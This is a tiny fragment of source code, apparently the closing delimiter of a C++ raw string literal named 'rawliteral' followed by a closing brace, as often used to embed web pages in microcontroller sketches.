)rawliteral";
}